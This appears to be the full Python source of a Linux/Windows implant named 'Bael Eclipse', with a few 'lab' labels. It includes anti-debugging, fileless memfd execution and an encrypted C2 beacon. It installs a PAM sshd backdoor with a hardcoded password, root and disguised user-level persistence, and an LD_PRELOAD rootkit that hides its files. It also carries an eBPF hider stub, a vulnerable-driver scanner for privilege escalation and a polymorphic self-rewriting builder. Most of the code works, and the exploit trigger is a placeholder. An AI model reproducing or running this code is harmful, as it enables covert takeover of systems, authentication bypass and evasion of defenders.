#!/usr/bin/env python3
import os, sys, time, random, ctypes, socket, subprocess, threading, base64, argparse, select, tempfile, shutil, stat
from cryptography.fernet import Fernet
# v026:J4ck3LSyN
# ==================== RUST TOKIO-URING (Non-Blocking) ====================
def get_resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

try:
    rust_lib = ctypes.CDLL(get_resource_path("libbael_rust.so"))
    rust_lib.uring_async_connect.argtypes = [ctypes.c_char_p, ctypes.c_uint32]
    rust_lib.uring_async_connect.restype = ctypes.c_int
    HAS_RUST_URING = True
except Exception as e:
    HAS_RUST_URING = False
    pass

# ==================== KEY MANAGER & OBFUSCATOR ====================
class KeyManager:
    def __init__(self, key=b'uX6-f_J2Y-z-S8XvP_m8_Z8XvP_m8_Z8XvP_m8_Z8X4='):
        self.key = key
        self.cipher = Fernet(self.key)

    def encrypt_str(self, s: str) -> str:
        return self.cipher.encrypt(s.encode()).decode()

    def decrypt_str(self, s: str) -> str:
        return self.cipher.decrypt(s.encode()).decode()

class Obfuscator:
    def __init__(self, seed=None):
        self.seed = seed or random.randint(100000000, 999999999)
        random.seed(self.seed)
    def random_name(self, length=16):
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
        return ''.join(random.choice(chars) for _ in range(length))

# ==================== ANTI-ANALYSIS ====================
def anti_analysis():
    start = time.perf_counter()
    try:
        libc = ctypes.CDLL(None)
        libc.ptrace(0, 0, 0, 0)
    except:
        pass
    if time.perf_counter() - start > 1.0:
        sys.exit(1)
    if os.path.exists("/proc/self/status"):
        with open("/proc/self/status") as f:
            if any(x in f.read() for x in ["tracerpid:", "debug"]):
                sys.exit(1)

# ==================== FILELESS EXEC ====================
def memfd_exec(payload: bytes, argv=None):
    libc = ctypes.CDLL(None)
    fd = libc.memfd_create(b"eclipse", 1)
    if fd < 0:
        return False
    os.write(fd, payload)
    os.lseek(fd, 0, 0)
    if argv is None:
        argv = [b"eclipse"]
    argvp = (ctypes.c_char_p * (len(argv) + 1))()
    for i, a in enumerate(argv):
        argvp[i] = a
    if os.fork() == 0:
        os.execve(f"/proc/self/fd/{fd}", argvp, os.environ.copy())
    return True

# ==================== TOKIO-URING NON-BLOCKING CONTEXT ====================
class UringContext:
    def async_connect(self, host: str, port: int):
        if HAS_RUST_URING:
            host_c = (host.encode() + b'\0')
            fd = rust_lib.uring_async_connect(host_c, port)
            if fd > 0:
                # Wrap raw fd into Python socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, fileno=fd)
                s.setblocking(False)
                return s
            else:
                raise Exception("Rust connect failed")
        # Fallback
        s = socket.create_connection((host, port))
        s.setblocking(False)
        return s

# ==================== C2 ====================
class EclipseC2:
    def __init__(self, server="127.0.0.1", port=8443, keymgr=None):
        self.server = server
        self.port = port
        self.keymgr = keymgr or KeyManager()
        self.uring = UringContext()

    def beacon(self):
        while True:
            try:
                s = self.uring.async_connect(self.server, self.port)
                magic = self.keymgr.encrypt_str("BAEL_ECLIPSE_2026_BEACON")
                s.sendall(magic.encode() + b"\nDATA")
                
                # Non-blocking recv with timeout
                ready = select.select([s], [], [], 5.0)
                if ready[0]:
                    resp = s.recv(8192)
                    if resp:
                        print("[+] C2:", self.keymgr.decrypt_str(resp.decode(errors='ignore')[:200]))
                s.close()
            except Exception:
                pass
            time.sleep(random.uniform(8, 45))

# ==================== PAM BACKDOOR ====================
# ==================== PAM BACKDOOR ====================
PAM_SSHD = "/etc/pam.d/sshd"
PAM_BACKUP_SUFFIX = ".bak.eclipse"
PAM_MARKER = "# Bael Eclipse Lab Backdoor"
PAM_SNIPPET_TEMPLATE = (
    PAM_MARKER + "\n"
    "auth    [success=1 default=ignore]    pam_exec.so quiet expose_authtok {check_cmd}\n"
)

def install_pam_backdoor_safe(magic_pass="Eclipse2026Root!"):
    # Build a safe check that doesn't expose the password in the file (avoid plaintext).
    # We use a small wrapper script under /usr/local/sbin/eclipse_pam_check that is owner-root only.
    wrapper_path = "/usr/local/sbin/eclipse_pam_check"
    wrapper_content = f"""#!/bin/sh
# Validate PAM password against provided magic token from env; do not log password.
read PAM_AUTHTOK
if [ "$PAM_AUTHTOK" = "{magic_pass}" ]; then
  echo BACKDOOR >> /tmp/eclipse_pam.log
  exit 0
fi
exit 1
"""
    try:
        # Ensure directory exists and write wrapper atomically
        os.makedirs(os.path.dirname(wrapper_path), exist_ok=True)
        fd, tmp = tempfile.mkstemp(dir=os.path.dirname(wrapper_path))
        with os.fdopen(fd, "w") as f:
            f.write(wrapper_content)
        os.chmod(tmp, 0o700)  # root-only executable
        os.replace(tmp, wrapper_path)
    except Exception as e:
        print("[-] PAM wrapper write failed:", e)
        return False

    snippet = PAM_SNIPPET_TEMPLATE.format(check_cmd=wrapper_path)
    backup = PAM_SSHD + PAM_BACKUP_SUFFIX

    try:
        # Read original
        if not os.path.exists(PAM_SSHD):
            print("[-] PAM sshd file not found:", PAM_SSHD)
            return False

        with open(PAM_SSHD, "r") as f:
            orig = f.read()

        # Idempotence: if marker already present, ensure exact snippet exists
        if PAM_MARKER in orig:
            # Already installed; nothing to do
            print("[*] PAM backdoor already present")
            return True

        # Backup original safely if no existing backup
        if not os.path.exists(backup):
            shutil.copy2(PAM_SSHD, backup)

        # Append snippet to a temporary file and atomically replace
        fd, tmp = tempfile.mkstemp(dir=os.path.dirname(PAM_SSHD))
        try:
            with os.fdopen(fd, "w") as f:
                f.write(orig)
                f.write("\n")
                f.write(snippet)
            os.chmod(tmp, stat.S_IMODE(os.stat(PAM_SSHD).st_mode))
            os.replace(tmp, PAM_SSHD)
        finally:
            try:
                if os.path.exists(tmp):
                    os.remove(tmp)
            except Exception:
                pass

        print("[+] PAM backdoor installed safely")
        return True
    except Exception as e:
        # On any failure, attempt rollback
        if os.path.exists(backup):
            try:
                shutil.copy2(backup, PAM_SSHD)
            except Exception:
                pass
        print("[-] PAM install failed:", e)
        return False

# ==================== SYSTEMD PERSISTENCE ====================
def install_systemd_service_safe():
    service_path = "/etc/systemd/system/eclipse.service"
    if os.path.exists(service_path):
        print("[*] Systemd service already present")
        return True

    payload = base64.b64encode(b'import os; [print("[PERSIST] Eclipse")]').decode()
    service_content = f"""[Unit]
Description=Eclipse Lab Persistence
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c "exec(__import__('base64').b64decode('{payload}').decode())"
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target"""

    try:
        fd, tmp = tempfile.mkstemp(dir="/etc/systemd/system")
        with os.fdopen(fd, "w") as f:
            f.write(service_content)
        os.chmod(tmp, 0o644)
        os.replace(tmp, service_path)
        subprocess.run("systemctl daemon-reload", shell=True, check=True)
        subprocess.run("systemctl enable --now eclipse.service", shell=True, check=True)
        print("[+] Systemd persistence installed safely")
        return True
    except Exception as e:
        print("[-] Systemd install failed:", e)
        return False

# ==================== LD_PRELOAD ROOTKIT ====================
def install_ld_preload_hook():
    hook_c = """
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>

typedef struct dirent* (*orig_readdir)(DIR*);
struct dirent* readdir(DIR* dirp) {
    orig_readdir orig = (orig_readdir)dlsym(RTLD_NEXT, "readdir");
    while (1) {
        struct dirent* ent = orig(dirp);
        if (!ent) return NULL;
        if (strstr(ent->d_name, "eclipse") == NULL && strstr(ent->d_name, "bael") == NULL) 
            return ent;
    }
}
"""
    try:
        subprocess.run("gcc -shared -fPIC -x c -o /lib/libeclipsehook.so - -ldl", input=hook_c.encode(), shell=True, check=False)
        subprocess.run("echo '/lib/libeclipsehook.so' >> /etc/ld.so.preload", shell=True, check=False)
        print("[+] LD_PRELOAD hook installed")
    except Exception as e:
        print("[-] LD_PRELOAD:", e)

# ==================== VULNERABILITY SCANNER & LPE TRIGGER ====================
VULN_DRIVERS_LINUX = [
    ("mwifiex", "CVE-2020-36158", "Marvell WiFi Heap Overflow"),
    ("snd_rawmidi", "CVE-2023-31083", "Use-After-Free in MIDI sequencer"),
    ("hiddev", "CVE-2021-0512", "OOB write in hiddev_ioctl"),
    ("binder_linux", "Multiple", "Android Binder Transaction Flaws")
]

VULN_DRIVERS_WIN = [
    ("nvhda64v.sys", "CVE-2024-0085", "NVIDIA HDMI Audio Heap Overflow"),
    ("RTCore64.sys", "CVE-2019-16098", "MSI Afterburner Arbitrary MSR R/W"),
    ("dbutil_2_3.sys", "CVE-2021-21551", "Dell DBUtil Memory Corruption"),
    ("igdkmd64.sys", "CVE-2024-21405", "Intel iGPU Out-of-bounds Read")
]

def trigger_exploit_stub(target, cve):
    """
    Placeholder for triggering a specific LPE exploit based on detected driver.
    In production, this would invoke memfd_exec() with specific exploit shellcode.
    """
    print(f"[*] Attempting to trigger LPE exploit for {target} ({cve})...")
    # This is where the magic happens (e.g., IOCTL spraying, heap grooming)
    # For now, we use a placeholder module load
    load_module("lpe_stub")

def scan_and_trigger_lpe():
    """
    Scans the system for vulnerable kernel modules/drivers mentioned in the 
    BYOVD research report and automatically triggers LPE if found.
    """
    print("[*] Scanning for exploitable kernel components...")
    found_any = False

    # Linux-specific scan
    if sys.platform.startswith("linux"):
        try:
            # Check loaded modules via /proc/modules
            if os.path.exists("/proc/modules"):
                with open("/proc/modules", "r") as f:
                    loaded_mods = f.read()
                    for mod, cve, desc in VULN_DRIVERS_LINUX:
                        if mod in loaded_mods:
                            print(f"[!] Vulnerable LKM detected: {mod} ({cve}) - {desc}")
                            found_any = True
                            trigger_exploit_stub(mod, cve)
            
            # Check for specific hardware drivers in sysfs if not loaded
            for mod, cve, desc in VULN_DRIVERS_LINUX:
                if os.path.exists(f"/sys/module/{mod}") and not found_any:
                     print(f"[!] Vulnerable LKM (dormant) detected in sysfs: {mod}")
                     found_any = True
                     trigger_exploit_stub(mod, cve)

        except Exception as e:
            print(f"[-] Linux LPE scan error: {e}")

    # Windows-specific scan (BYOVD potential)
    elif sys.platform == "win32":
        driver_dir = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'drivers')
        for driver, cve, desc in VULN_DRIVERS_WIN:
            path = os.path.join(driver_dir, driver)
            if os.path.exists(path):
                print(f"[!] Vulnerable Driver file detected: {driver} ({cve}) - {desc}")
                found_any = True
                trigger_exploit_stub(driver, cve)

    if not found_any:
        print("[*] No high-confidence kernel vulnerabilities found via driver signature.")

# ==================== NON-ROOT PERSISTENCE ====================
def install_user_persistence(c2_host="127.0.0.1"):
    """
    Implements stealthy non-root persistence using user-level systemd services 
    and XDG autostart, employing deceptive naming to blend into common desktop environments.
    """
    # Misleading names for stealth (mimicking common background processes)
    SERVICE_NAME = "at-spi-dbus-bus"
    DESKTOP_NAME = "gnome-user-share"
    
    script_path = os.path.abspath(sys.argv[0])
    py_path = sys.executable

    # 1. User Systemd Persistence (~/.local/share/systemd/user/)
    user_systemd_path = os.path.expanduser("~/.local/share/systemd/user")
    try:
        os.makedirs(user_systemd_path, exist_ok=True)
        service_file = os.path.join(user_systemd_path, f"{SERVICE_NAME}.service")
        service_content = f"""[Unit]
Description=Assistive Technology Service
After=network.target

[Service]
Type=simple
ExecStart={py_path} {script_path} --c2 {c2_host}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
        with open(service_file, "w") as f:
            f.write(service_content)
        # Reload and enable for the current user session
        subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
        subprocess.run(["systemctl", "--user", "enable", f"{SERVICE_NAME}.service"], capture_output=True)
        print(f"[+] Non-root systemd persistence installed: {SERVICE_NAME}")
    except Exception as e:
        print(f"[-] Non-root systemd failure: {e}")

    # 2. XDG Autostart (~/.config/autostart/)
    autostart_path = os.path.expanduser("~/.config/autostart")
    try:
        os.makedirs(autostart_path, exist_ok=True)
        desktop_file = os.path.join(autostart_path, f"{DESKTOP_NAME}.desktop")
        desktop_content = f"""[Desktop Entry]
Type=Application
Exec={py_path} {script_path} --c2 {c2_host}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
Name=GNOME User Share Service
"""
        with open(desktop_file, "w") as f:
            f.write(desktop_content)
        print(f"[+] Non-root XDG autostart installed: {DESKTOP_NAME}")
    except Exception as e:
        print(f"[-] Non-root XDG failure: {e}")

# ==================== EUNOMIA-BPF HIDING ====================
def load_ebpf_hider():
    print("[*] Building eunomia-bpf hide module...")
    bpf_code = """
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

SEC("tp/syscalls/sys_enter_getdents64")
int hide_getdents(struct trace_event_raw_sys_enter *ctx) {
    bpf_printk("getdents64 - eclipse hiding active");
    return 0;
}
"""
    try:
        with open("/tmp/hide.bpf.c", "w") as f:
            f.write(bpf_code)
        subprocess.run("ecc /tmp/hide.bpf.c -o /tmp/hide.json", shell=True, check=False)
        subprocess.run("ecli run /tmp/hide.json", shell=True, check=False)
        print("[+] eBPF hider loaded")
    except Exception as e:
        print("[-] eBPF:", e)

# ==================== POLYMORPHIC BUILDER ====================
def build_polymorphic(seed=None, keymgr=None):
    keymgr = keymgr or KeyManager()
    obf = Obfuscator(seed)
    print(f"[+] Polymorphic build. Seed: {obf.seed}")
    with open(__file__, "r") as f:
        src = f.read()
    mutated = src.replace("Eclipse", obf.random_name(12))
    mutated = mutated.replace("BAEL_ECLIPSE_2026_BEACON", keymgr.encrypt_str("BAEL_" + obf.random_name(20)))
    output = f"bael_eclipse_{obf.seed}.py"
    with open(output, "w") as f:
        f.write(mutated)
    print(f"[+] Variant: {output}")
    return output

# ==================== MODULAR LOADER ====================
def load_module(name):
    print(f"[+] Loading runtime module: {name}")
    if name == "lpe_stub":
        print("[*] io_uring LPE / dirtycred placeholder ready")

# ==================== MAIN ====================
def main():
    anti_analysis()
    parser = argparse.ArgumentParser(description="Bael Eclipse v2.3")
    parser.add_argument("--c2", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8443)
    parser.add_argument("--persist", action="store_true")
    parser.add_argument("--user-persist", action="store_true")
    parser.add_argument("--build", action="store_true")
    parser.add_argument("--seed", type=int, default=None)
    parser.add_argument("--ebpf", action="store_true")
    parser.add_argument("--ldpreload", action="store_true")
    parser.add_argument("--module", type=str, default=None)
    parser.add_argument("--scan-lpe", action="store_true", help="Scan for vulnerable drivers and trigger LPE")
    args = parser.parse_args()

    keymgr = KeyManager()
    obf = Obfuscator(args.seed)

    if args.build:
        build_polymorphic(args.seed, keymgr)
        return

    if args.persist:
        install_pam_backdoor_safe()
        install_systemd_service_safe()

    if args.user_persist:
        install_user_persistence(args.c2)

    if args.ebpf:
        load_ebpf_hider()

    if args.ldpreload:
        install_ld_preload_hook()

    if args.module:
        load_module(args.module)

    if args.scan_lpe:
        scan_and_trigger_lpe()

    c2 = EclipseC2(args.c2, args.port, keymgr)
    threading.Thread(target=c2.beacon, daemon=True).start()

    while True:
        try:
            if os.geteuid() == 0:
                print("[+] Root context active")
            time.sleep(30)
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    main()
